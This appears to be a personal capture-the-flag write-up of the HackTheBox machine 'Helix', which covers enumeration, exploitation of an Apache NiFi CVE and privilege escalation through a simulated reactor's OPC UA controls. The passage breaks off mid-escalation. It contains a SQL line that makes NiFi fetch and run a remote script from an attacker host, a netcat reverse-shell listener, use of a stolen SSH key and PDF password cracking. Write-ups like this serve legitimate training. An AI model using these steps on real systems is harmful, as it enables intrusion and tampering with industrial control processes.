# HelixHTB
Personal writeup of the Helix HTB the machine

### Test was done over course of multiple machine resets so IP addresses may differ ###

Intial nmap scan of the machine shows 2 PoA available

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# nmap -sV -sC 10.129.2.74      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-22 12:46 +0900
Nmap scan report for 10.129.2.74
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.80 seconds
```

We can attempt to go to `http://10.129.2.74` but the browser won't redirect us. We need to first add `helix.htb` and the corresponding IP to `/etc/hosts` file on our machine.

Once adding the hostname to the hosts file we can see a cybersecurity organization website with very little control availability. There are 2 buttons that when activated and inspected don't call anything and are red herrings. We can enumerate further with `ffuf` and `feroxbuster`.

Both `ffuf` and `feroxbuster` don't reveal any information subdirectory wise but `ffuf` allows us to find a hidden subdomain called `flow.helix.htb`.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://helix.htb -H "Host: FUZZ.helix.htb" -s -mc 200
flow
```

When we access the URL we actually bypass any sort of login required for an `Apache NiFi` site. Older versions of NiFi actually completely bypass any needed login so we can assume that this site is using an older version of `Apache NiFi`. 

In fact the user access to the backend site gives us dangerous read/write permissions to the UI board which could be used to escalate permissions. We can do some research and come up with [CVE-2023-24468](https://github.com/mbadanoiu/CVE-2023-34468). 

TLDR; The DBCPConnectionPool and HikariCPConnectionPool Controller Services in Apache NiFi 0.0.2 through 1.21.0 allow an authenticated and authorized user to configure a Database URL with the H2 driver that enables custom code execution. Leading to an RCE and reverse shell.

There is a PDF file within the GitHub PoC provided and we can follow that to a tee. 

We need to first copy the `rce.sql` code from the [PDF](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf) (Tailored code provided) and follow the corresponding steps:

Right-Click ExecuteSQL -> Configure -> PROPERTIES tab -> SQL select query -> paste the following:

```
RUNSCRIPT FROM 'http://<attacker-ip>:4444/rce.sql'
```

We can then make sure that we are hosting a Python `http.server` in the same directory as our `rce.sql` file

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

In a separate terminal we can setup our listener.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# nc -lvnp 5555           
listening on [any] 5555 ...
```

We can then execute the `ExecuteSQL` processor and watch it connect to our machine.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.2.106 - - [22/May/2026 17:35:37] "GET /rce.sql HTTP/1.1" 200 -

┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# nc -lvnp 5555           
listening on [any] 5555 ...
connect to [<attacker_ip>] from (UNKNOWN) [10.129.2.106] 57412
bash: cannot set terminal process group (966): Inappropriate ioctl for device
bash: no job control in this shell
nifi@helix:/opt/nifi-1.21.0$ 
```

Success. We've obtained a reverse shell onto the nifi's connection to the backend system. We can upgrade job control in the shell to make our job easier. Read more [here](https://medium.com/@Thigh_GoD/how-to-automatically-upgrade-a-dumb-reverse-shell-6a4cb5c44997).

We can now enumerate the system for any local vulnerabilites or left clues as to where to look to further escalate privileges. Checking the `/etc/passwd` file gives us some clues.

```
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
operator:x:1001:1001::/home/operator:/bin/bash
nifi:x:998:998::/opt/nifi:/usr/sbin/nologin
plc:x:997:997::/opt/ot:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
```

Theres a user named `operator` within the machine that may have clues or existing files on the machine that could help us narrow down getting to the user flag or privilege escalation.

```
nifi@helix:/opt/nifi-1.21.0$ find / -iname "*operator*" 2>/dev/null
/home/operator
/usr/lib/python3.11/lib2to3/fixes/fix_operator.py
/usr/lib/python3/dist-packages/twisted/test/test_cooperator.py
/usr/lib/python3/dist-packages/twisted/test/__pycache__/test_cooperator.cpython-310.pyc
/usr/lib/python3.10/lib2to3/fixes/fix_operator.py
/usr/lib/python3.10/lib2to3/fixes/__pycache__/fix_operator.cpython-310.pyc
/usr/lib/python3.10/__pycache__/operator.cpython-310.pyc
/usr/lib/python3.10/operator.py
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
nifi@helix:/opt/nifi-1.21.0$ 
```

Nothing of note besides one file. `/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak`. The key part of this is the `id_ed25519`. This represents an ssh key. If we are able to read the key we can copy it and use it to bypass password authentication for the user `operator`.

```
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak 
-----BEGIN OPENSSH PRIVATE KEY-----
<PRIVATE_KEY_HERE>
-----END OPENSSH PRIVATE KEY-----
nifi@helix:/opt/nifi-1.21.0/support-bundles$ 
```

Fantastic. We can copy the key directly over to our attacker machine, `chmod 600` it and intiate an SSH connection via the user `operator`.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# chmod 600 operator_key                        
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# ssh -i ./operator_key operator@10.129.2.106   
The authenticity of host '10.129.2.106 (10.129.2.106)' can't be established.
ED25519 key fingerprint is: SHA256:nGwNnXA5oCIEMCxZ3joJWy3usUFUt70Wqy72RayvMNA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.2.106' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri May 22 09:13:07 AM UTC 2026

  System load:           0.0
  Usage of /:            87.1% of 6.52GB
  Memory usage:          42%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.2.106
  IPv6 address for eth0: dead:beef::a0de:adff:fe0d:fd34

  => / is using 87.1% of 6.52GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri May 22 09:13:09 2026 from 10.10.16.65
operator@helix:~$
```

We can find the `user.txt` flag in the home directory.

```
operator@helix:~$ cat user.txt
<USER_FLAG_HERE>
```

We can now do the same thing again. Attempt to find an alternative way to escalate privileges to root via the `operator` user. 

```
operator@helix:~$ sudo -l
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Checking `sudo` permissions we can see that the user `operator` has sudo permissions via the `/usr/local/sbin/helix-maint-console`. We can go there and enumerate further to see what exactly it does.

```
operator@helix:~$ cd /usr/local/sbin/
operator@helix:/usr/local/sbin$ ls
helix-cleanup.sh  helix-maint-console  laurel  unminimize
operator@helix:/usr/local/sbin$ cat helix-maint-console
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0
operator@helix:
```

This is interesting. This is a custom file so known CVE's would be available. The file is referencing a `maintenance_window` file in a different directory that if activated and the `maint-helix-console` is called at the same time, can grant the executing user root access to the machine for a period of time.

We can try to go further to view the file's contents to see what exactly it contains.

```
operator@helix:/usr/local/sbin$ cd /opt/helix/state
-bash: cd: /opt/helix/state: Permission denied
operator@helix:/usr/local/sbin$ cat /opt/helix/state/maintenance_window
cat: /opt/helix/state/maintenance_window: Permission denied
operator@helix:/usr/local/sbin$ ls -la /opt/helix/state/
ls: cannot access '/opt/helix/state/': Permission denied
```

Permissions on the machine are setup to restrict any outside access besides root to view the contents of the file or the directory. We can further enumerate what might be running the script/maintenance window using `ss`.

```
operator@helix:/usr/local/sbin$ ss -tlnp
State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
LISTEN 0      50              127.0.0.1:35903        0.0.0.0:*            
LISTEN 0      50              127.0.0.1:8080         0.0.0.0:*            
LISTEN 0      128             127.0.0.1:8081         0.0.0.0:*            
LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
LISTEN 0      100             127.0.0.1:4840         0.0.0.0:*            
LISTEN 0      511               0.0.0.0:80           0.0.0.0:*            
LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
LISTEN 0      50     [::ffff:127.0.0.1]:40275              *:*            
LISTEN 0      128                  [::]:22              [::]:*          
```

An interesting find. Port 4840 is the official, well-known port for OPC UA (Open Platform Communications Unified Architecture), an industrial machine-to-machine communication protocol used for data exchange, equipment control, and monitoring. Which goes in line with the context of the machine. Likely that it's using OPC UA as a service to control some sort of "machine" or industrial communications network between the actual machinery and the backend/server.  

The service is being hosted locally via `localhost`. 

We can attempt an SSH tunnel to it through our attacker machine.

```
operator@helix:~$ ssh -L 4840:127.0.0.1:4840 operator@10.129.2.106 -i operator_key
```

Via research we know that the only way to communicate with OPC UA is `asyncua`. AsyncUA is a pure Python library used to build OPC UA (Open Platform Communications Unified Architecture) clients and servers. It is primarily designed for Industrial Internet of Things (IIoT) and automation systems to securely exchange data with PLCs, sensors, and industrial machinery. It's a likely candidate for the `maintenance_window` controller that we need to activate in order to access and root shell within the server.

We can redundantly `pip install asyncua` on the victim server as a check before moving forward.

Now that `asyncua` is properly installed we have to clarify some information.

The `asyncWalk.py` file is a full crawl of the server's address space to surface anything that table missed. It reveals hidden nodes, undocumented thresholds, or whatever the watcher daemon is actually reading.
It walks the OPC UA tree depth first from Objects (i=85), printing each node's class, NodeId, browse name, and (for variables) its value.

We can use the supplemental information to gain an understanding of what the UPC UA is controlling and what the machine actually is.

```
ns=2;i=1 QualifiedName(NamespaceIndex=2, Name='Plant')
     ns=2;i=2 QualifiedName(NamespaceIndex=2, Name='Reactor')
       ns=2;i=3 QualifiedName(NamespaceIndex=2, Name='TemperatureRaw')
       ns=2;i=4 QualifiedName(NamespaceIndex=2, Name='Temperature')
       ns=2;i=5 QualifiedName(NamespaceIndex=2, Name='Pressure')
       ns=2;i=6 QualifiedName(NamespaceIndex=2, Name='CalibrationOffset')
     ns=2;i=7 QualifiedName(NamespaceIndex=2, Name='Safety')
       ns=2;i=8 QualifiedName(NamespaceIndex=2, Name='RodsInserted')
       ns=2;i=9 QualifiedName(NamespaceIndex=2, Name='EmergencyCooling')
       ns=2;i=10 QualifiedName(NamespaceIndex=2, Name='TripActive')
     ns=2;i=11 QualifiedName(NamespaceIndex=2, Name='Control')
       ns=2;i=12 QualifiedName(NamespaceIndex=2, Name='Mode')
       ns=2;i=13 QualifiedName(NamespaceIndex=2, Name='TestOverride')
       ns=2;i=14 QualifiedName(NamespaceIndex=2, Name='ResetTrip')
```

The output will look much longer than this but we're only interested in the custom configurations to identify what it is we're actually working with. 

With the information we can make an educated guess: This is an industrial-control simulation — a nuclear reactor model. The `maintenance_window` condition we saw earlier almost certainly opens only when the plant is in a safe, maintenance ready state. You manipulate the plant state into a condition that causes the maintenance window to open. However, identifying the correct conditions to put it into a maintenance state blind would be next to impossible. We need to see if there is any information that can help.

Earlier on in the `operator` home directory there were 2 files: a `.pdf` and a `.png` file that had the respective names of `'Operator Control & Safety Guide.pdf'` and `'control systems diagram.png'`. We can pull those files from the home directory into ours to view them.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# scp -i operator_key -r operator@10.129.2.106:~/'control systems diagram.png' .
control systems diagram.png             100%  899KB 318.7KB/s   00:02    
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# scp -i operator_key -r operator@10.129.2.106:~/'Operator Control & Safety Guide.pdf' .
Operator Control & Safety Guide.pdf     100%   28KB  27.8KB/s   00:01    
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# ls                  
'Operator Control & Safety Guide.pdf'   nodeOVERRIDE.py   rce.sql
 asyncuaCLI.py                          operator_key      writeup.txt
'control systems diagram.png'           pID.sh
```

Attempting to open either of these files results in a password protected `.pdf` file and a corrupted metadata `.png` file. The PDF is a likely candidate for the most useful information so we can pipe the pdf hash into `john` and attempt to crack it.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:44 1.42% (ETA: 21:23:36) 0g/s 5442p/s 5442c/s 5442C/s lucinha..lailaa
<CRACKED_PASSWORD_HERE>        (Operator Control & Safety Guide.pdf)     
1g 0:00:00:48 DONE (2026-05-22 20:32) 0.02054g/s 5428p/s 5428c/s 5428C/s pingris..nsyncrox
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```

With the cracked password we can attempt to recover the data within the PNG to see if it also brings useful information.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
└─# convert 'control systems diagram.png' diagram_clean.png
```

Opening and reading the PDF and the PNG confirms our hypthesis. As a respect to the machine and the challenge I wont display the information in either but the PDF gives us a step-by-step guide on how to activate the maintence mode on the OPC. 

This is something that could be done manually but would be incredibly slow. We can instead streamline it with 2 separate python scripts.

`asyncuaCLI.py` loops over `ns=2;i=1` through `14`, printing each node's browse name, current value, and `UserAccessLevel` so you can see what's actually readable and writable. The `UserAccessLevel` is the key detail, it's the level of control your session actually has, which is what determines whether your offset and flag writes will apply or not. Access levels of `1` correspond to `read` privileges only while `2` and `3` correspond to `write` and `read/write` privileges respectively. 